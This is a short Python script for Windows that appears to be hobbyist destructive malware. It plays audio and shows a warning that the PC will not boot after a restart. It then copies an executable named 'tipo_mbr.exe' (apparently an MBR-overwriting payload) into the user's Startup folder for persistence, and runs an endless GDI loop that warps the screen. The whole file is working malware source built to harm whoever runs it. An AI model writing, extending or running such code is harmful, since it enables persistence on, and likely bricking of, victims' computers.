import win32gui
from win32gui import *
import ctypes
import os
import shutil
import tkinter as tk
from tkinter import messagebox
import pygame

pygame.init()
pygame.mixer.music.load("yaica.mp3")

messagebox.showwarning("CHELOVEK YAICA", "This is a last warning. your system don't be booted if you restart PC!, so use as long as you can.")

pygame.mixer.music.play()

current_dir = os.path.dirname(os.path.abspath(__file__))

file_name = "tipo_mbr.exe"

source_file = os.path.join(current_dir, file_name)

startup_folder = os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\Start Menu\Programs\Startup")

destination_file = os.path.join(startup_folder, file_name)

try:
    shutil.copy(source_file, destination_file)
    print(f"Файл успешно скопирован в автозагрузку: {destination_file}")
except FileNotFoundError:
    print(f"Файл {file_name} не найден в текущей папке: {current_dir}")
except PermissionError:
    print("Недостаточно прав для копирования. Попробуйте запустить скрипт с правами администратора.")
except Exception as e:
    print(f"Произошла ошибка: {e}")

destination_file = os.path.join(startup_folder, file_name)

user32 = ctypes.windll.user32
user32.SetProcessDPIAware()
[sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]

screen_size = win32gui.GetWindowRect(win32gui.GetDesktopWindow())

left = screen_size[0]
top = screen_size[1]
right = screen_size[2]
bottom = screen_size[3]


lpppoint = ((left + 50, top - 50), (right + 50, top + 50), (left - 50, bottom - 50))


while True:

    hdc = win32gui.GetDC(0)
    mhdc = CreateCompatibleDC(hdc)
    hbit = CreateCompatibleBitmap(hdc, sh, sw)
    holdbit = SelectObject(mhdc, hbit)

    PlgBlt(
        hdc,
        lpppoint,
        hdc,
        left - 20,
        top - 20,
        (right - left) + 40,
        (bottom - top) + 40,
        None,
        0,
        0,
    )

